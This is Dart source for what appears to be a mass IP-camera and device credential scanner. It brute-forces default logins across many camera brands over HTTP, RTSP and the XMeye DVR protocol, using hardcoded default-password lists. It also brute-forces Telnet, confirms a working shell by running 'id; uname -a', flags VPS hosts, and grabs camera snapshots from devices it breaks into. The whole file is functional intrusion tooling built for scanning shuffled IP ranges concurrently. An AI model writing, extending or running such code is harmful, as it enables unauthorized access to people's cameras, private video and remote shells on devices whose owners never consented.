      final resp = await _httpGet(ip, port, '/axis-cgi/param.cgi?action=list&group=Brand', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      final model = resp.body.split('ProdFullName=').last.split('\n').first.trim();
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: model.isEmpty ? 'Axis' : model, channels: 1, snapshot: null, brand: 'Axis');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryVivotekAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/viewer/getparam.cgi?system_hostname', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Vivotek', channels: 1, snapshot: null, brand: 'Vivotek');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryHanwhaAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/stw-cgi/system.cgi?msubmenu=deviceinfo&action=view', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Hanwha', channels: 1, snapshot: null, brand: 'Hanwha');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryBoschAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/rcp.xml?command=0x0a01&type=P_OCTET&direction=READ&num=1', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Bosch', channels: 1, snapshot: null, brand: 'Bosch');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryGeoVisionAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/ssi.cgi/Login.htm', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'GeoVision', channels: 1, snapshot: null, brand: 'GeoVision');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryACTiAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/system?USER=$l&PWD=$p&SYSTEM_INFO', '', '');
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'ACTi', channels: 1, snapshot: null, brand: 'ACTi');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryGrandstreamAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/goform/login?username=$l&password=$p', '', '');
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Grandstream', channels: 1, snapshot: null, brand: 'Grandstream');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _trySonyAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/command/inquiry.cgi?inqjs=system', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Sony', channels: 1, snapshot: null, brand: 'Sony');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _trySamsungAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/config-manager?action=getSystemInfo', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Samsung', channels: 1, snapshot: null, brand: 'Samsung');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryPanasonicAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/getinfo?FILE=1', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Panasonic', channels: 1, snapshot: null, brand: 'Panasonic');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryHoneywellAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/ISAPI/System/deviceInfo', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Honeywell', channels: 1, snapshot: null, brand: 'Honeywell');
    } catch (_) { return null; }
  }

  // ── Herospeed SHA256 challenge-response (mirrors DahuaScanner.kt tryHerospeedAuth) ──
  Future<ScanResult?> _tryHerospeedAuth(String ip, int port, String l, String p) async {
    try {
      final capR = await _httpGet(ip, port, '/api/session/login-capabilities?username=$l', '', '');
      if (capR == null || capR.statusCode != 200) return null;
      final challenge  = _extractJsonField(capR.body, 'challenge') ?? '';
      final iterations = int.tryParse(_extractJsonField(capR.body, 'iterations') ?? '1') ?? 1;
      if (challenge.isEmpty) return null;
      var hashStr = '$l:$p:$challenge';
      for (int i = 0; i < iterations; i++) {
        hashStr = sha256.convert(utf8.encode(hashStr)).toString();
      }
      final loginResp = await _httpPost(ip, port, '/api/session/login',
          jsonEncode({'username': l, 'password': hashStr}));
      if (loginResp == null || loginResp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Herospeed', channels: 1, snapshot: null, brand: 'Herospeed');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryAmcrestAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/magicBox.cgi?action=getDeviceType', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Amcrest', channels: 1, snapshot: null, brand: 'Amcrest');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryCPPlusAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/magicBox.cgi?action=getDeviceType', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'CPPlus', channels: 1, snapshot: null, brand: 'CPPlus');
    } catch (_) { return null; }
  }

  Future<ScanResult?> _tryIntelbrasAuth(String ip, int port, String l, String p) async {
    try {
      final resp = await _httpGet(ip, port, '/cgi-bin/magicBox.cgi?action=getDeviceType', l, p);
      if (resp == null || resp.statusCode != 200) return null;
      return ScanResult(ip: ip, port: port, login: l, password: p,
          model: 'Intelbras', channels: 1, snapshot: null, brand: 'Intelbras');
    } catch (_) { return null; }
  }

  // ── tryBrandGenericAuth: probe snapshot path, check 401→auth→snap ────────────
  Future<ScanResult?> _tryBrandGenericAuth(String ip, int port, String l, String p, String brand) async {
    final paths = _snapshotPathsForBrand(brand);
    for (final path in paths) {
      if (_cancelled) return null;
      try {
        final probe = await _httpGet(ip, port, path, '', '');
        if (probe == null) continue;
        if (probe.statusCode == 200 && probe.bodyBytes.length > 500) {
          final b = probe.bodyBytes;
          if (b.length >= 2 && b[0] == 0xFF && b[1] == 0xD8) {
            return ScanResult(ip: ip, port: port, login: '', password: '',
                model: brand, channels: 1, snapshot: b, brand: brand);
          }
        }
        if (probe.statusCode == 401 || probe.statusCode == 403) {
          final authed = await _httpGet(ip, port, path, l, p);
          if (authed != null && authed.statusCode == 200) {
            final snap = await _getSnapshotGeneric(ip, port, l, p, paths);
            return ScanResult(ip: ip, port: port, login: l, password: p,
                model: brand, channels: 1, snapshot: snap, brand: brand);
          }
        }
      } catch (_) {}
    }
    return null;
  }

  List<String> _snapshotPathsForBrand(String brand) {
    switch (brand) {
      case 'Tiandy':   return ['/cgi-bin/snapshot.cgi', '/snap.jpg', '/snapshot.jpg'];
      case 'TVT':      return ['/cgi-bin/snapshot.cgi', '/snap.jpg'];
      case 'VStarcam': return ['/snapshot.cgi', '/snap.jpg'];
      case 'Pelco':    return ['/image?res=full&quality=100', '/cgi-bin/snapshot.cgi'];
      case 'Sony':     return ['/image', '/oneshotimage.jpg', '/cgi-bin/view/snapshot.cgi'];
      case 'Panasonic':return ['/cgi-bin/camera?resolution=640x480', '/SnapshotJPEG?Resolution=640x480', '/snap.jpg'];
      default:         return ['/cgi-bin/snapshot.cgi', '/snap.jpg', '/snapshot.jpg',
                               '/image/jpeg.cgi', '/tmpfs/snap.jpg', '/tmpfs/auto.jpg',
                               '/jpg/image.jpg', '/image.jpg', '/stream.jpg',
                               '/stream/current.jpg', '/image/1.jpg'];
    }
  }

  Future<Uint8List?> _getSnapshotGeneric(String ip, int port, String l, String p, List<String> paths) async {
    for (final path in paths) {
      try {
        final r = await _httpGet(ip, port, path, l, p);
        if (r != null && r.statusCode == 200 && r.bodyBytes.length > 100) return r.bodyBytes;
      } catch (_) {}
    }
    return null;
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // RTSP 3-PHASE BRUTE FORCE — mirrors DahuaScanner.kt tryRtspAuth()
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _tryRtspAuth(String ip, int port) async {
    // Phase 1: anon probe — find route
    String? targetRoute;
    for (final route in _kRtspRoutes) {
      if (_cancelled) return null;
      final code = await _rtspDescribe(ip, '', '', route, port);
      if (code == 200) {
        return ScanResult(ip: ip, port: port, login: '', password: '',
            model: 'RTSP', channels: 1, snapshot: null, brand: 'RTSP');
      }
      if (code == 401) { targetRoute = route; break; }
    }

    // Phase 2: find auth-requiring route with dummy cred
    if (targetRoute == null) {
      for (final route in _kRtspRoutes) {
        if (_cancelled) return null;
        final code = await _rtspDescribe(ip, 'admin', 'admin', route, port);
        if (code == 401 || code == 403) { targetRoute = route; break; }
      }
    }
    if (targetRoute == null) return null;

    // Phase 3: brute on found route
    for (final cred in _kRtspCredentials) {
      if (_cancelled) return null;
      final code = await _rtspDescribe(ip, cred[0], cred[1], targetRoute, port);
      if (code == 200) {
        final brand = await _rtspOptionsBrand(ip, port) ?? 'RTSP';
        return ScanResult(ip: ip, port: port, login: cred[0], password: cred[1],
            model: brand, channels: 1, snapshot: null, brand: brand);
      }
    }
    return null;
  }

  Future<int> _rtspDescribe(String ip, String login, String pass, String route, int port) async {
    try {
      final sock = await Socket.connect(ip, port, timeout: _kTimeoutConnect);
      sock.setOption(SocketOption.tcpNoDelay, true);
      final userInfo = login.isEmpty ? '' : '$login:$pass@';
      final cseq     = Random().nextInt(9999) + 1;
      final auth     = login.isNotEmpty
          ? 'Authorization: Basic ${base64.encode(utf8.encode("$login:$pass"))}\r\n' : '';
      final req = 'DESCRIBE rtsp://$userInfo$ip:$port$route RTSP/1.0\r\n'
          'CSeq: $cseq\r\n'
          'User-Agent: LibVLC/3.0.0 (LIVE555 Streaming Media v2016.11.28)\r\n'
          'Accept: application/sdp\r\n'
          '$auth\r\n';
      sock.add(utf8.encode(req));
      await sock.flush();

      final buf      = BytesBuilder();
      final deadline = DateTime.now().add(_kTimeoutRead);
      final completer = Completer<void>();
      late StreamSubscription<Uint8List> sub;
      sub = sock.listen((chunk) {
        buf.add(chunk);
        final s = utf8.decode(buf.toBytes(), allowMalformed: true);
        if (s.contains('\r\n\r\n') || DateTime.now().isAfter(deadline)) {
          sub.cancel();
          if (!completer.isCompleted) completer.complete();
        }
      }, onError: (_) {
        sub.cancel();
        if (!completer.isCompleted) completer.complete();
      }, onDone: () {
        if (!completer.isCompleted) completer.complete();
      });
      await completer.future.timeout(_kTimeoutRead, onTimeout: () { sub.cancel(); });
      await sock.close();

      final resp  = utf8.decode(buf.toBytes(), allowMalformed: true);
      final match = RegExp(r'RTSP/1\.[01]\s+(\d{3})').firstMatch(resp);
      return int.tryParse(match?.group(1) ?? '') ?? -1;
    } catch (_) { return -1; }
  }

  Future<String?> _rtspOptionsBrand(String ip, int port) async {
    try {
      final sock = await Socket.connect(ip, port, timeout: _kTimeoutConnect);
      sock.add(utf8.encode('OPTIONS rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.0\r\n\r\n'));
      await sock.flush();
      final buf = BytesBuilder();
      final completer = Completer<void>();
      late StreamSubscription<Uint8List> sub;
      sub = sock.listen((chunk) {
        buf.add(chunk);
        if (buf.length > 2048) { sub.cancel(); if (!completer.isCompleted) completer.complete(); }
      }, onDone: () { if (!completer.isCompleted) completer.complete(); },
         onError: (_) { if (!completer.isCompleted) completer.complete(); });
      await completer.future.timeout(const Duration(seconds: 4), onTimeout: () { sub.cancel(); });
      await sock.close();
      final resp = utf8.decode(buf.toBytes(), allowMalformed: true);
      if (!resp.contains('RTSP/1.')) return null;
      return _detectRtspBrand(resp);
    } catch (_) { return null; }
  }

  String _detectRtspBrand(String resp) {
    final r = resp.toLowerCase();
    if (r.contains('hikvision') || r.contains('hikdigital')) return 'Hikvision';
    if (r.contains('dahua') || r.contains('dh-')) return 'Dahua';
    if (r.contains('axis') || r.contains('vapix')) return 'Axis';
    if (r.contains('reolink')) return 'Reolink';
    if (r.contains('bosch')) return 'Bosch';
    if (r.contains('vivotek')) return 'Vivotek';
    if (r.contains('amcrest')) return 'Amcrest';
    if (r.contains('uniview') || r.contains('unv')) return 'Uniview';
    if (r.contains('hanwha') || r.contains('wisenet')) return 'Hanwha';
    if (r.contains('panasonic') || r.contains('i-pro')) return 'Panasonic';
    if (r.contains('sony')) return 'Sony';
    if (r.contains('tiandy')) return 'Tiandy';
    if (r.contains('xmeye') || r.contains('xiongmai')) return 'XMeye';
    if (r.contains('foscam')) return 'Foscam';
    if (r.contains('live555')) return 'Generic/RTSP';
    if (r.contains('ipc') || r.contains('dvr') || r.contains('nvr')) return 'Generic DVR';
    return 'RTSP';
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // XMEYE BINARY PROTOCOL (34567) — mirrors DahuaScanner.kt tryXMeye()
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _tryXMeye(String ip) async {
    const creds = [
      ['admin',''],   ['admin','admin'],   ['admin','123456'],
      ['admin','12345'],['admin','888888'],['admin','666666'],
      ['default','tluafed'],['admin','abcd1234'],['guest',''],['admin','000000'],
    ];

    for (final cred in creds) {
      if (_cancelled) return null;
      try {
        final sock = await Socket.connect(ip, 34567, timeout: _kTimeoutConnect);
        sock.setOption(SocketOption.tcpNoDelay, true);

        final passHash  = _xmeyeHashPassword(cred[1]);
        final loginJson = '{"EncryptType":"MD5","LoginType":"DVRIP-Web","PassWord":"$passHash","UserName":"${cred[0]}"}';
        final packet    = _buildXMeyePacket(0x03e8, loginJson);
        sock.add(packet);
        await sock.flush();

        final header = await _readExact(sock, 20, _kTimeoutRead);
        if (header != null && header.length >= 20) {
          final dataLen = ((header[15] & 0xFF) << 8) | (header[14] & 0xFF);
          if (dataLen > 0 && dataLen <= 8192) {
            final data = await _readExact(sock, dataLen, _kTimeoutRead);
            if (data != null) {
              final response = utf8.decode(data, allowMalformed: true);
              if (response.contains('"Ret" : 100') || response.contains('"SessionID"')) {
                await sock.close();
                return ScanResult(ip: ip, port: 34567, login: cred[0], password: cred[1],
                    model: 'XMeye/DVR', channels: 1, snapshot: null, brand: 'XMeye');
              }
            }
          }
        }
        await sock.close();
      } catch (_) {}
    }
    return null;
  }

  // XMeye MD5 password hash — mirrors xmeyeHashPassword() in DahuaScanner.kt
  String _xmeyeHashPassword(String password) {
    if (password.isEmpty) return '';
    final hash = md5.convert(utf8.encode(password)).bytes;
    final sb   = StringBuffer();
    for (int i = 0; i < hash.length; i += 2) {
      final sum = (hash[i] & 0xFF) + (i + 1 < hash.length ? hash[i + 1] & 0xFF : 0);
      final v   = sum % 62;
      if (v < 10) {
        sb.writeCharCode('0'.codeUnitAt(0) + v);
      } else if (v < 36) {
        sb.writeCharCode('A'.codeUnitAt(0) + v - 10);
      } else {
        sb.writeCharCode('a'.codeUnitAt(0) + v - 36);
      }
    }
    return sb.toString();
  }

  // XMeye 20-byte packet — mirrors buildXMeyePacket() in DahuaScanner.kt
  Uint8List _buildXMeyePacket(int msgId, String json) {
    final data   = utf8.encode('$json\n');
    final header = Uint8List(20);
    header[0]  = 0xFF;
    header[1]  = 0x01;
    header[8]  = msgId & 0xFF;
    header[9]  = (msgId >> 8) & 0xFF;
    header[14] = data.length & 0xFF;
    header[15] = (data.length >> 8) & 0xFF;
    return Uint8List.fromList([...header, ...data]);
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // SSH BANNER PROBE — raw TCP, iOS has no SSH library
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _trySsh(String ip) async {
    try {
      final sock = await Socket.connect(ip, 22, timeout: _kTimeoutConnect);
      final buf  = BytesBuilder();
      final completer = Completer<String>();
      late StreamSubscription<Uint8List> sub;
      sub = sock.listen((chunk) {
        buf.add(chunk);
        final s = utf8.decode(buf.toBytes(), allowMalformed: true).trim();
        if (s.startsWith('SSH-')) {
          sub.cancel();
          if (!completer.isCompleted) completer.complete(s.split('\n').first.trim());
        }
        if (buf.length > 512) {
          sub.cancel();
          if (!completer.isCompleted) completer.complete('');
        }
      }, onDone: () { if (!completer.isCompleted) completer.complete(''); },
         onError: (_) { if (!completer.isCompleted) completer.complete(''); });

      final banner = await completer.future.timeout(const Duration(seconds: 3), onTimeout: () {
        sub.cancel(); return '';
      });
      await sock.close();
      if (!banner.startsWith('SSH-')) return null;
      return ScanResult(ip: ip, port: 22, login: 'banner', password: '',
          model: banner.length > 80 ? banner.substring(0, 80) : banner,
          channels: 0, snapshot: null, brand: 'SSH-TTY');
    } catch (_) { return null; }
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // TELNET BRUTE — mirrors DahuaScanner.kt tryTelnet()
  // ══════════════════════════════════════════════════════════════════════════════

  Future<ScanResult?> _tryTelnet(String ip, int telnetPort) async {
    try {
      final s = await Socket.connect(ip, telnetPort, timeout: _kTimeoutConnect);
      await s.close();
    } catch (_) { return null; }

    for (final cred in _kSshCredentials) {
      if (_cancelled) return null;
      try {
        final sock   = await Socket.connect(ip, telnetPort, timeout: _kTimeoutConnect);
        final buf    = BytesBuilder();
        final allBuf = BytesBuilder();
        late StreamSubscription<Uint8List> sub;
        sub = sock.listen((chunk) { buf.add(chunk); allBuf.add(chunk); },
            onDone: () {}, onError: (_) {});

        // wait for banner
        await Future.delayed(const Duration(milliseconds: 800));
        if (buf.isEmpty) { sub.cancel(); await sock.close(); continue; }

        final welcomeBytes = buf.toBytes();
        buf.clear();

        // IAC negotiation
        final iacResp = _handleTelnetIAC(welcomeBytes);
        if (iacResp.isNotEmpty) { sock.add(iacResp); await sock.flush(); }

        // send login
        sock.add(utf8.encode('${cred[0]}\r\n'));
        await sock.flush();
        await Future.delayed(const Duration(milliseconds: 600));
        buf.clear();

        // send password
        sock.add(utf8.encode('${cred[1]}\r\n'));
        await sock.flush();
        await Future.delayed(const Duration(milliseconds: 800));

        final passResp = utf8.decode(allBuf.toBytes(), allowMalformed: true);
        final lower    = passResp.toLowerCase();

        const failIndicators = ['login incorrect','login failed','authentication fail',
            'bad password','access denied','invalid password','wrong password','denied'];
        if (failIndicators.any((f) => lower.contains(f))) {
          sub.cancel(); await sock.close(); continue;
        }

        const promptIndicators = ['# ', r'$ ', '> ', 'busybox', 'root@', 'admin@', '~ #', '/ #'];
        if (!promptIndicators.any((p) => passResp.contains(p) || lower.contains(p))) {
          sub.cancel(); await sock.close(); continue;
        }

        // TTY validation
        sock.add(utf8.encode('id; uname -a\r\n'));
        await sock.flush();
        await Future.delayed(const Duration(milliseconds: 1500));

        final cmdResp  = utf8.decode(allBuf.toBytes(), allowMalformed: true);
        final cmdLower = cmdResp.toLowerCase();
        final hasReal  = cmdLower.contains('uid=') || cmdLower.contains('gid=') ||
            cmdLower.contains('linux') || cmdLower.contains('busybox');

        if (!hasReal) { sub.cancel(); await sock.close(); continue; }

        const vpsMarkers = ['kvm','qemu','vmware','virtualbox','xen','openstack',
            'hetzner','digitalocean','aws','amazon','google','azure','linode',
            'vultr','ovh','contabo','lxc','openvz','docker'];
        final isVPS = vpsMarkers.any((m) => cmdLower.contains(m)) ||
            (cmdLower.contains('x86_64') &&
             (cmdLower.contains('ubuntu') || cmdLower.contains('debian') || cmdLower.contains('centos')));

        sub.cancel(); await sock.close();
        final brand = isVPS ? 'VPS' : 'Telnet-TTY';
        final model = isVPS ? 'VPS $ip'
            : (cmdLower.contains('busybox') ? 'BusyBox/Linux'
               : cmdLower.contains('dvr') ? 'DVR TTY' : 'TTY');
        return ScanResult(ip: ip, port: telnetPort, login: cred[0], password: cred[1],
            model: model, channels: 0, snapshot: null, brand: brand);
      } catch (_) { continue; }
    }
    return null;
  }

  // ── IAC negotiation — mirrors handleTelnetIAC() in DahuaScanner.kt ───────────
  Uint8List _handleTelnetIAC(Uint8List data) {
    final resp = BytesBuilder();
    for (int i = 0; i < data.length - 2; i++) {
      if (data[i] == 0xFF) {
        final cmd = data[i + 1];
        final opt = data[i + 2];
        if (cmd == 251 || cmd == 252) resp.add([0xFF, 0xFE, opt]); // WILL/WONT → DONT
        if (cmd == 253)               resp.add([0xFF, 0xFC, opt]); // DO → WONT
        // 254 DONT: no response per RFC 854
        i += 2;
      }
    }
    return resp.toBytes();
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // HTTP HELPERS
  // ══════════════════════════════════════════════════════════════════════════════

  Future<_HttpResp?> _httpGet(String ip, int port, String path, String l, String p) async {
    final scheme = _kHttpsPortSet.contains(port) ? 'https' : 'http';
    try {
      final client = HttpClient()
        ..connectionTimeout = _kTimeoutConnect
        ..badCertificateCallback = (_, __, ___) => true;
      final req = await client.getUrl(Uri.parse('$scheme://$ip:$port$path')).timeout(_kTimeoutConnect);
      req.headers.set('User-Agent', 'Mozilla/5.0');
      if (l.isNotEmpty) req.headers.set('Authorization', 'Basic ${base64.encode(utf8.encode("$l:$p"))}');
      final resp   = await req.close().timeout(_kTimeoutHttp);
      final chunks = await resp.toList().timeout(_kTimeoutHttp);
      final bytes  = Uint8List.fromList(chunks.expand((b) => b).toList());
      client.close(force: true);
      return _HttpResp(resp.statusCode, bytes);
    } catch (_) { return null; }
  }

  Future<_HttpResp?> _httpPost(String ip, int port, String path, String body) async {
    final scheme = _kHttpsPortSet.contains(port) ? 'https' : 'http';
    try {
      final client = HttpClient()
        ..connectionTimeout = _kTimeoutConnect
        ..badCertificateCallback = (_, __, ___) => true;
      final req = await client.postUrl(Uri.parse('$scheme://$ip:$port$path')).timeout(_kTimeoutConnect);
      req.headers.contentType = ContentType.json;
      req.add(utf8.encode(body));
      final resp   = await req.close().timeout(_kTimeoutHttp);
      final chunks = await resp.toList().timeout(_kTimeoutHttp);
      final bytes  = Uint8List.fromList(chunks.expand((b) => b).toList());
      client.close(force: true);
      return _HttpResp(resp.statusCode, bytes);
    } catch (_) { return null; }
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // XML / JSON FIELD EXTRACTORS
  // ══════════════════════════════════════════════════════════════════════════════

  String? _extractXmlField(String xml, String tag) {
    final s = xml.indexOf('<$tag>');
    if (s == -1) return null;
    final vs = s + tag.length + 2;
    final e  = xml.indexOf('</$tag>', vs);
    if (e == -1) return null;
    return xml.substring(vs, e).trim();
  }

  String? _extractJsonField(String json, String field) =>
      RegExp('"$field"\\s*:\\s*"([^"]+)"').firstMatch(json)?.group(1);

  // ══════════════════════════════════════════════════════════════════════════════
  // BATCH SCAN DRIVER — mirrors scan() / scanMultiPort() in DahuaScanner.kt
  // ══════════════════════════════════════════════════════════════════════════════

  Future<void> scanIps({
    required List<String> ips,
    required List<int> ports,
    required void Function(ScanResult) onResult,
    required void Function(ScanProgress) onProgress,
  }) async {
    _cancelled = false;
    _checked   = 0; _success = 0; _blocked = 0; _openPorts = 0;

    final shuffled  = List<String>.from(ips)..shuffle();
    final total     = shuffled.length;
    final startTime = DateTime.now();
    int   active    = 0;

    final ticker = Stream.periodic(const Duration(milliseconds: 200)).listen((_) {
      if (_cancelled || _checked >= total) return;
      final elapsed = DateTime.now().difference(startTime).inMilliseconds;
      onProgress(ScanProgress(total: total, checked: _checked, found: _success,
          blocked: _blocked, elapsedMs: elapsed, openPorts: _openPorts));
    });

    final futures = <Future>[];
    for (final ip in shuffled) {
      if (_cancelled) break;
      while (active >= _kMaxConcurrent) {
        await Future.delayed(const Duration(milliseconds: 20));
      }
      active++;
      futures.add(() async {
        try {
          if (!_cancelled) {
            final result = await _scanSelectedPortsInternal(ip, ports);
            if (result != null) {
              if (result.blocked) { _blocked++; } else { _success++; }
              onResult(result);
            }
          }
        } finally {
          _checked++;
          active--;
        }
      }());
    }
    await Future.wait(futures);
    ticker.cancel();

    final elapsed = DateTime.now().difference(startTime).inMilliseconds;
    onProgress(ScanProgress(total: total, checked: _checked, found: _success,
        blocked: _blocked, elapsedMs: elapsed, openPorts: _openPorts,
        finished: !_cancelled, cancelled: _cancelled));
  }

  /// Legacy single-port scan interface (kept for backward compat with ScanScreen)
  Future<void> scan({
    required List<String> ips,
    required int port,
    required void Function(ScanResult) onResult,
    required void Function(ScanProgress) onProgress,
    void Function(String)? onLog,
  }) => scanIps(ips: ips, ports: [port], onResult: onResult, onProgress: onProgress);

  /// Legacy multi-port interface
  Future<void> scanMultiPort({
    required List<String> ips,
    required List<int> ports,
    required void Function(ScanResult) onResult,
    required void Function(ScanProgress) onProgress,
    void Function(String)? onLog,
  }) => scanIps(ips: ips, ports: ports, onResult: onResult, onProgress: onProgress);
}

// ══════════════════════════════════════════════════════════════════════════════
// INTERNAL TYPES
// ══════════════════════════════════════════════════════════════════════════════

enum _AuthStatus { success, blocked, fail }

class _HttpResp {
  final int       statusCode;
  final Uint8List bodyBytes;
  String get body => utf8.decode(bodyBytes, allowMalformed: true);
  const _HttpResp(this.statusCode, this.bodyBytes);
}
